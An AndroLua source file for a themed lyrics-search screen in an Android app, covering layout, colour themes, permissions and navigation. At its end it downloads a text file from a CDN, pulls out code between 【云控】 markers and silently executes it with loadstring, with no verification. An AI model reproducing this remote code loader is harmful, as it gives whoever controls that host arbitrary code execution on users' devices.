
-- ****默认导入包****
require "import"
import "android.os.*"
import "android.widget.*"
import "android.view.*"
-- ****不需要请删除****

import "androidx.appcompat.widget.LinearLayoutCompat"
import "com.google.android.material.appbar.AppBarLayout"
import "androidx.viewpager.widget.ViewPager"
import "androidx.cardview.widget.CardView"
import "com.google.android.material.imageview.ShapeableImageView"
import "android.widget.LinearLayout"
import "android.widget.TextView"
import "androidx.appcompat.widget.Toolbar"
import "android.content.res.ColorStateList"
import "android.widget.Toolbar"
import "android.view.View"
import "androidx.core.widget.NestedScrollView"
import "com.google.android.material.appbar.CollapsingToolbarLayout"
import "com.google.android.material.bottomnavigation.BottomNavigationView"
import "androidx.coordinatorlayout.widget.CoordinatorLayout"
import "android.view.WindowManager"


import "android.widget.Toolbar"
import "androidx.appcompat.widget.Toolbar"
import "androidx.core.widget.NestedScrollView"
import "com.bumptech.glide.Glide"
import "android.view.WindowManager"
import "com.google.android.material.card.MaterialCardView"
import "android.view.View"
import "com.androlua.Http"
import "com.google.android.material.bottomnavigation.BottomNavigationView"
import "androidx.viewpager.widget.ViewPager"
import "com.google.android.material.appbar.AppBarLayout"
import "android.widget.ImageView"
import "androidx.appcompat.widget.LinearLayoutCompat"
import "android.widget.LinearLayout"
import "android.content.res.ColorStateList"
import "androidx.coordinatorlayout.widget.CoordinatorLayout"
import "com.google.android.material.appbar.CollapsingToolbarLayout"
import "android.widget.TextView"
import "android.content.Context"--文本复制

require"import"
material={"animation","appbar","badge","behavior","bottomappbar","bottomnavigation","bottomsheet","button","canvas","card","checkbox","chip","circularreveal","color","datepicker","dialog","divider","drawable","elevation","expandable","floatingactionbutton","imageview","internal","math","navigation","radiobutton","resources","ripple","shadow","shape","slider","snackbar","stateful","switchmaterial","tabs","textfield","textview","theme","timepicker","tooltip","transformation","transition",}
local path="com.google.android.material."
import (path.."*")
for _,v in pairs(material) do
  import(path..v..".*")
end

import "android.Manifest"
import "androidx.core.app.ActivityCompat"
ActivityCompat.requestPermissions(activity,
String{Manifest.permission.WRITE_EXTERNAL_STORAGE,Manifest.permission.READ_EXTERNAL_STORAGE}, 0);
--动态权限申请-勿删



theme=tonumber(activity.getSharedData("the"))

-- ****默认导入包****
require "import"
import "android.os.*"
import "android.widget.*"
import "android.view.*"

import "android.widget.LinearLayout"
import "android.view.View"
import "com.google.android.material.card.MaterialCardView"
import "androidx.cardview.widget.CardView"
import "android.widget.TextView"
import "android.widget.EditText"
import "android.widget.ImageView"
import "com.google.android.material.dialog.MaterialAlertDialogBuilder"
import "android.view.WindowManager"
import "com.androlua.LuaAdapter"
import "android.widget.ListView"




import "com.google.android.material.card.MaterialCardView"
import "android.widget.LinearLayout"
import "android.widget.ImageView"
import "android.widget.ListView"
import "android.app.DownloadManager"
import "android.net.Uri"
import "androidx.core.app.ActivityCompat"
import "android.content.Context"
import "com.androlua.LuaAdapter"
import "android.widget.EditText"
import "android.widget.TextView"
import "com.google.android.material.dialog.MaterialAlertDialogBuilder"
import "java.util.jar.Manifest"
import "android.Manifest"
import "androidx.cardview.widget.CardView"
import "java.lang.String"
import "android.view.View"

import "android.content.Intent"
import "android.net.Uri"
wxp=tonumber(activity.getSharedData("wx"))



--获取系统颜色
local resources=activity.getResources()
function m3c(s)
  value = resources.getColor(android.R.color[s])
  return value
end



--
import "androidx.recyclerview.widget.RecyclerView"
import "android.widget.TextView"
import "android.widget.LinearLayout"
import "com.androlua.LuaRecyclerAdapter"
import "androidx.recyclerview.widget.LinearLayoutManager"
import "com.google.android.material.card.MaterialCardView"
import "androidx.recyclerview.widget.RecyclerView$Orientation"
import "androidx.viewpager2.widget.ViewPager2$Orientation"
import "android.graphics.drawable.GradientDrawable$Orientation"
import "androidx.core.widget.NestedScrollView"
import "android.view.WindowManager"
import "com.google.android.material.button.MaterialButton"
import "androidx.recyclerview.widget.*"
import "com.google.android.material.snackbar.Snackbar"
import "com.google.android.material.card.MaterialCardView"
import "com.google.android.material.appbar.AppBarLayout"
import "android.graphics.Color"


--颜色
背景色=0xFFF6F2EF
文字色=0xFF032107
标题色=0xFF706F6D
字体黑色=0xFF000000
字体白色=0xFFFFFFFF
浅色=0xFFFFE28B
深色=0xFFFFB86A
卡片底色=0xFFFFFFFF
大标题色=0xFF000000
透明=0x1FFFFFF
卡片文本=0xFF000000
按钮底色=0xFFFFB86A
按钮文本=0xFFFFFFFF
红色=0xFFFF0040

if theme == 1 then
 
 elseif theme == 2 then
 背景色=0xFFF5F5F5
 浅色=0xFFB3B3B3
 深色=0xFF000000
 按钮底色=0xFF000000
 按钮文本=0xFFFFFFFF
 elseif theme == 3 then
 背景色=0xFFF9E6E5
 浅色=0xFFFEB4B3
 深色=0xFFFEB4B3
 按钮底色=0xFFFEB4B3
 按钮文本=0xFFFFFFFF
 elseif theme == 4 then
 背景色=0xFFF3FFE8
 浅色=0xFF96C34E
 深色=0xFF96C34E
 按钮底色=0xFF96C34E
 按钮文本=0xFFFFFFFF
 elseif theme == 5 then
 背景色=0xff182048
 深色=0xFFBDC7E6
 浅色=0xFFD1DCFF
 大标题色=0xFFFFFFFF
 标题色=0xFFFFFFFF
 卡片底色=0xFF5C6391
 卡片文本=0xFFFFFFFF
 按钮底色=0xFFBDC7E6
 按钮文本=0xFFFFFFFF
 elseif theme == 6 then
 背景色=0xFFBF3545
 深色=0xFFE0C28F
 浅色=0xFFFFFFFF
 大标题色=0xFFFFE6B0
 标题色=0xFFC7B990
 卡片底色=0xFF9D1636
 卡片文本=0xFFFFE6B0
 按钮底色=0xFFE0C28F
 按钮文本=0xFFFFFFFF
 elseif theme == 7 then
 背景色=0xFF6A798E
 深色=0xFFC4CDD7
 浅色=0xFFEAF0FF
 大标题色=0xFFEAF0FF
 标题色=0xFFC0CAD3
 卡片底色=0xFFEAF0FF
 卡片文本=0xFF274466
 按钮底色=0xFFC4CDD7
 按钮文本=0xFFFFFFFF
 elseif theme == 8 then
 背景色=0xff000000
 深色=0xFFFFFFFF
 浅色=0xFF252525
 大标题色=0xFFFFFFFF
 标题色=0xFFFFFFFF
 卡片底色=0xFF252525
 卡片文本=0xFFFFFFFF 
 elseif theme == 9 then
 背景色=0xFFB6DBF6
 深色=0xFFFFFFFF
 浅色=0xFFFFFFFF
 大标题色=0xFFFFFFFF
 标题色=0xFFFFFFFF
 卡片底色=0xFFA2C5FF
 卡片文本=0xFFFFFFFF
 按钮底色=0xFF74A8FF
 按钮文本=0xFFFFFFFF
 elseif theme == 10 then--浅色跟随
 背景色=m3c("system_neutral1_10")
 大标题色=m3c("system_accent1_600")
 标题色=m3c("system_accent1_600")
 浅色=m3c("system_accent1_600")
 深色=m3c("system_accent1_600")
 卡片底色=m3c("system_accent2_50")
 卡片文本=m3c("system_accent1_600")
 按钮底色=m3c("system_accent1_200")
 按钮文本=m3c("system_neutral1_10")
 elseif theme == 11 then--深色跟随
 背景色=m3c("system_accent1_600")
 大标题色=m3c("system_neutral1_10")
 标题色=m3c("system_neutral1_10")
 浅色=m3c("system_neutral1_10")
 深色=m3c("system_neutral1_10")
 卡片底色=m3c("system_accent1_200")
 卡片文本=m3c("system_accent1_600")
 按钮底色=m3c("system_accent1_800")
 按钮文本=m3c("system_neutral1_10")
end



--r
if activity.getPackageName()=="net.fusion64j" then
  R=luajava.bindClass "net.fusion64j.R"
 else
  R=luajava.bindClass "net.fusion64j.core.R"
end

--函数
function checked(vv,num)--底栏项目选中事件
  vv.getMenu().getItem(num).setChecked(true)
end
--退出动画
function onKeyDown(key,event)
  if(key==4)then
    activity.finish()
    --下面代码的参数(1,2)就是和跳转复制代码相反(2,1)
    activity.overridePendingTransition(R.anim.fragment_open_enter,R.anim.fragment_close_exit)
  end
end






Tritium=
{
  LinearLayout;--线性控件
  orientation='vertical';--布局方向
  layout_width='fill';--布局宽度
  layout_height='fill';--布局高度  
  backgroundColor=背景色;
     {
        MaterialCardView;--卡片控件
        layout_margin='5dp';--边距
        layout_gravity='center|left';--重力
        elevation='0dp';--阴影
        layout_width='fill';--宽度
        layout_height='80dp';--高度
        CardBackgroundColor=背景色;--颜色
        radius='40dp';--圆角
        layout_marginLeft='0dp';--左距
        layout_marginRight='0dp';--右距
        layout_marginTop="60dp",--顶距       
        elevation='0dp';--阴影    
       {
        TextView,
        layout_gravity='center|left';--重力
        layout_marginLeft='30dp';--左距
        text="歌词",
        textSize="28sp",
        textStyle="bold",
        textColor=大标题色;--文字颜色
        id="Ti2",
       },       
       {
        MaterialCardView;--卡片控件
        layout_margin='5dp';--边距
        layout_gravity='center|right';--重力
        elevation='0dp';--阴影
        layout_width='30dp';--宽度
        layout_height='30dp';--高度
        CardBackgroundColor=背景色;--颜色
        radius='50dp';--圆角
        layout_marginLeft='180dp';--左距
        layout_marginRight='40dp';--右距
        layout_marginTop="5dp",--顶距       
        elevation='0dp';--阴影
        id="";
         {
          ImageView,
          scaleType="centerCrop",
          layout_width="fill",
          layout_height="fill",
          layout_marginTop="0dp",--顶距
          layout_margin='0%w';--边距
          src="ic_public_cancel.png",
          ColorFilter=大标题色;--图片着色  
          id="back";
         },       
      
       },     
      },
  {
    CardView;--卡片控件
    layout_width='fill';--卡片宽度
    layout_height='48dp';--卡片高度
    cardBackgroundColor=卡片底色;--卡片颜色
    layout_marginLeft='30dp';--左距
    layout_marginRight='30dp';--左距
    layout_margin='0dp';--卡片边距
    cardElevation='0dp';--卡片阴影
    radius='17dp';--卡片圆角
    {
      EditText;--编辑框控件
      layout_width='fill';--控件宽度
      layout_height='fill';--控件高度
      id='edit';--设置控件ID
      Hint='搜索';--编辑框内容为空时提示文字
      hintTextColor=标题色;--提示文字颜色
      textSize='16sp';--本文大小
      textColor=大标题色;--本文颜色
      layout_marginLeft='15dp';--布局左距
      layout_marginRight='15dp';--布局右距
      gravity='center|left';--重力
      background='#00ffffff';--底条透明
      singleLine=true;--设置单行输入，禁止换行
      imeOptions='actionSearch';--设置回车键搜索,必须开启单行输入才能生效
    };
  };
  {
    ListView;--列表适配器
    layout_marginLeft='23dp';--左距
    layout_marginRight='23dp';--左距
    layout_marginTop='10dp';--左距
    layout_width='fill';--宽度
    layout_height='fill';--高度
    id="list";
    dividerHeight="0";--分割线高度
    verticalScrollBarEnabled=true;--隐藏滑条
  };
  {
    LinearLayout;--线性控件
    orientation='vertical';--布局方向
    layout_width='fill';--布局宽度
    layout_height='fill';--布局高度
    id='tips';--控件ID
    {
      TextView;--文本控件
      layout_width='fill';--控件宽度
      layout_height='fill';--控件高度
      text='无结果\n(该搜索不支持模糊搜索呢🥲)';--显示文字
      gravity='center';--重力
      textColor=大标题色;--文字颜色
    };
  };
}


activity.setContentView(loadlayout(Tritium))


item=--配置项目布局表
{
  LinearLayout;--线性控件
  orientation='vertical';--布局方向
  layout_width='fill';--布局宽度
  layout_height='fill';--布局高度
  {
    CardView;--卡片控件
    layout_width='fill';--卡片宽度
    layout_height='wrap';--卡片高度
    cardBackgroundColor=卡片底色;--卡片颜色
    layout_marginLeft='6dp';--左距
    layout_marginRight='6dp';--左距
    layout_marginTop='10dp';--卡片边距
    layout_marginBottom='10dp';--卡片边距
    cardElevation='0dp';--卡片阴影
    id='main';--设置控件ID
    radius='20dp';--卡片圆角
        {
        ImageView,       
        layout_marginLeft='50dp';--边距    
        layout_marginRight='20dp';--边距     
        layout_width='25dp';--宽度
        layout_height='25dp';--高度    
        layout_margin='0dp';--边距 
        layout_gravity='center|right';--重力
        scaleType="centerCrop",                 
        src="ic_public_download.png",      
        ColorFilter=卡片文本;--图片着色                        
       };
    {
      LinearLayout;--线性控件
      orientation='vertical';--布局方向
      layout_width='fill';--布局宽度
      layout_height='wrap';--布局高度
      layout_marginLeft='12dp';--布局左距
      layout_marginRight='12dp';--布局右距
      layout_marginTop='6dp';--布局顶距
      layout_marginBottom='10dp';--布局底距
      {
        TextView;--文本控件
        layout_marginTop='10dp';--布局顶距
        gravity='center|left';--重力属性          
        layout_marginLeft='10dp';--边距 
        layout_marginRight='60dp';--边距 
        layout_width='fill';--控件宽度
        layout_height='wrap';--控件高度
        textSize='16sp';--文字大小
        textColor=大标题色;--文字颜色
        gravity='left|center';--重力
        id='title';--设置控件ID
      };
      {
        TextView;--文本控件
        layout_width='fill';--控件宽度
        gravity='center|left';--重力属性
        layout_height='wrap';--控件高度
        layout_marginLeft='10dp';--边距 
        layout_marginRight='60dp';--边距 
        layout_marginTop='1dp';--布局顶距
        MaxLines=3;--设置最大输入行数
        textColor=标题色;--文字颜色
        ellipsize='end';--多余文字用省略号显示
        gravity='left|center';--重力
        id='content';--设置控件ID
      };
      {
        TextView;--文本控件
        layout_width='fill';--控件宽度
        layout_height='0dp';--控件高度
        layout_marginTop='4dp';--布局顶距
        MaxLines=3;--设置最大输入行数
        ellipsize='end';--多余文字用省略号显示
        gravity='left|center';--重力
        id='link';--设置控件ID
      };

    };
  };
};


function back.onClick()
  activity.finish()
  activity.overridePendingTransition(R.anim.fragment_open_enter,R.anim.fragment_close_exit)
end


--沉浸状态栏
activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS)

--主题补充
if theme == 1 then
 
 elseif theme == 2 then
 activity.getWindow().clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS | WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION)
 activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS).setStatusBarColor(背景色)
 elseif theme == 3 then
 activity.getWindow().clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS | WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION)
 activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS).setStatusBarColor(背景色)
 elseif theme == 4 then
 activity.getWindow().clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS | WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION)
 activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS).setStatusBarColor(背景色)
 elseif theme == 5 then
 --设置顶部状态栏颜色
 activity.getWindow().clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS | WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION)
 activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS).setStatusBarColor(背景色)
 back.setColorFilter(0xFFFFFFFF) 
 this.getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_VISIBLE)
 elseif theme == 6 then
 activity.getWindow().clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS | WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION)
 activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS).setStatusBarColor(背景色)
 back.setColorFilter(0xFFFFE6B0)
 this.getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_VISIBLE)
 elseif theme == 7 then
 activity.getWindow().clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS | WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION)
 activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS).setStatusBarColor(背景色)
 back.setColorFilter(0xFFEAF0FF)
 this.getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_VISIBLE)
 elseif theme == 8 then
 activity.getWindow().clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS | WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION)
 activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS).setStatusBarColor(背景色)
 back.setColorFilter(0xFFFFFFFF)
 this.getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_VISIBLE)
 elseif theme == 9 then 
 activity.getWindow().clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS | WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION)
 activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS).setStatusBarColor(背景色)
 back.setColorFilter(0xFFFFFFFF)
 this.getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_VISIBLE)
 elseif theme == 10 then 
 activity.getWindow().clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS | WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION)
 activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS).setStatusBarColor(背景色)
 elseif theme == 11 then 
 activity.getWindow().clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS | WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION)
 activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS).setStatusBarColor(背景色)
 this.getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_VISIBLE)
end

--沉浸导航栏
activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION)

Http.get("https://cdn.lightxi.com/cloudreve/uploads/2024/05/03/HsRYlPJW_mus%20lrc.txt",nil,nil,nil,function(code,content)
  if(code==200 and content)then
    content=content:gsub("&nbsp;"," ") or content;
    content=content:gsub("&lt;","<") or content;
    content=content:gsub("&gt;",">") or content;
    content=content:gsub("&amp;","&") or content;
    if(content)then
      取代码=content:match('content="(.+)" />')
      远程加载代码=content:match("【云控】(.-)【云控】")
      local status,error=pcall(loadstring(远程加载代码))

      if not status then

      end
    end
  end   
end)

function back.onClick()
  activity.finish()
  activity.overridePendingTransition(R.anim.fragment_open_enter,R.anim.fragment_close_exit)
end
